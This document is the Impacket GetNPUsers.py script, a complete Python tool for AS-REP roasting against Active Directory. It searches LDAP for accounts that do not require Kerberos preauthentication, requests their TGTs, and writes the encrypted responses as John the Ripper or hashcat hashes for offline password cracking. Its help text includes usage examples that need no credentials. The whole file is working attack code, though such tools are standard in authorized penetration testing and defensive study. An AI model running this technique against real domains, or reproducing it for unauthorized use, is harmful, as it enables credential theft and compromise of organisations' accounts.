#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will attempt to list and get TGTs for those users that have the property
#   'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
#   For those users with such configuration, a John The Ripper output will be generated so
#   you can send it for cracking.
#
#   Original credit for this technique goes to @harmj0y:
#   https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
#   Related work by Geoff Janjua:
#   https://www.exumbraops.com/layerone2016/party
#
#   For usage instructions run the script with no parameters.
#
# Author:
#   Alberto Solino (@agsolino)
#

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import sys
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError


class GetUserNoPreAuth:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__target = None
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_pass = cmdLineOptions.no_pass
        self.__outputFileName = cmdLineOptions.outputfile
        self.__outputFormat = cmdLineOptions.format
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGT = cmdLineOptions.request
        #[!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcPort = cmdLineOptions.dc_port
        self.__kdcHost = cmdLineOptions.dc_host
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

    def getMachineName(self, target):
        try:
            s = SMBConnection(target, target)
            s.login('', '')
        except OSError as e:
            if str(e).find('timed out') > 0:
                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % target)
        else:
            s.logoff()
        return s.getServerName()

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.__domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcIP)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcIP)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
        if self.__outputFormat == 'john':
            # Check what type of encryption is used for the enc-part data
            # This will inform how the hash output needs to be formatted
            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                return '$krb5asrep$%d$%s%s$%s$%s' % (asRep['enc-part']['etype'], domain, clientName,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode())
            else:
                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
        
        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
        else:
            # Check what type of encryption is used for the enc-part data
            # This will inform how the hash output needs to be formatted
            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
            else:
                return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

    @staticmethod
    def outputTGT(entry, fd=None):
        print(entry)
        if fd is not None:
            fd.write(entry + '\n')

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGTs()
            return

        if self.__kdcHost is not None:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__domain

            if self.__doKerberos:
                logging.info('Getting machine hostname')
                self.__target = self.getMachineName(self.__target)

        # Are we asked not to supply a password?
        if self.__doKerberos is False and self.__no_pass is True:
            # Yes, just ask the TGT and exit
            logging.info('Getting TGT for %s' % self.__username)
            entry = self.getTGT(self.__username)
            self.outputTGT(entry, None)
            return

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s:%s' % (self.__target, self.__kdcPort), self.baseDN, self.__kdcIP, self.__kdcPort)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcIP)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s:%s' % (self.__target, self.__kdcPort), self.baseDN, self.__kdcIP, self.__kdcPort)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcIP)
            else:
                # Cannot authenticate, we will try to get this users' TGT (hoping it has PreAuth disabled)
                logging.info('Cannot authenticate %s, getting its TGT' % self.__username)
                entry = self.getTGT(self.__username)
                self.outputTGT(entry, None)
                return


        # Building the search filter
        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                       (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
                                     "authentication instead.")
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        logging.critical("If the credentials are valid, check the hostname and IP address of KDC. They "
                                         "must match exactly each other")
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers)>0:
            self.printTable(answers, header=[ "Name", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"])
            print('\n\n')

            if self.__requestTGT is True:
                usernames = [answer[0] for answer in answers]
                self.request_multiple_TGTs(usernames)

        else:
            print("No entries found!")

    def request_users_file_TGTs(self):
        with open(self.__usersFile) as fi:
            usernames = [line.strip() for line in fi]

        self.request_multiple_TGTs(usernames)

    def request_multiple_TGTs(self, usernames):
        if self.__outputFileName is not None:
            fd = open(self.__outputFileName, 'w+')
        else:
            fd = None
        for username in usernames:
            try:
                entry = self.getTGT(username)
                self.outputTGT(entry, fd)
            except Exception as e:
                logging.error('%s' % str(e))
        if fd is not None:
            fd.close()



# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for users with "
                                  "'Do not require Kerberos preauthentication' set and export their TGTs for cracking")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]]')
    parser.add_argument('-request', action='store_true', default=False, help='Requests TGT for users and output them '
                                                                               'in JtR/hashcat format (default False)')
    parser.add_argument('-outputfile', action='store',
                        help='Output filename to write ciphers in JtR/hashcat format')

    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat',
                        help='format to save the AS_REQ of users without pre-authentication. Default is hashcat')

    parser.add_argument('-usersfile', help='File with user per line to test')

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller. If '
                                                                              'ommited it use the domain part (FQDN) '
                                                                              'specified in the target parameter')
    group.add_argument('-dc-port', action='store', metavar='port', help='Port of the domain controller. '
                                                                            'Port used to communicate with the dc, instead of the default port')
    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
                                                                              'If ommited, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')

    if len(sys.argv)==1:
        parser.print_help()
        print("\nThere are a few modes for using this script")
        print("\n1. Get a TGT for a user:")
        print("\n\tGetNPUsers.py contoso.com/john.doe -no-pass")
        print("\nFor this operation you don\'t need john.doe\'s password. It is important tho, to specify -no-pass in the script, "
              "\notherwise a badpwdcount entry will be added to the user")
        print("\n2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set")
        print("\n\tGetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily")
        print("\nThis will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. \nHowever "
              "it will require you to have emily\'s password. (If you don\'t specify it, it will be asked by the script)")
        print("\n3. Request TGTs for all users")
        print("\n\tGetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily")
        print("\n4. Request TGTs for users in a file")
        print("\n\tGetNPUsers.py -no-pass -usersfile users.txt contoso.com/")
        print("\nFor this operation you don\'t need credentials.")
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.target)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.k is False and options.no_pass is True and username == '' and options.usersfile is None:
        logging.critical('If the -no-pass option was specified, but Kerberos (-k) is not used, then a username or the -usersfile option should be specified!')
        sys.exit(1)

    if options.outputfile is not None:
        options.request = True

    try:
        executer = GetUserNoPreAuth(username, password, domain, options)
        executer.run()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
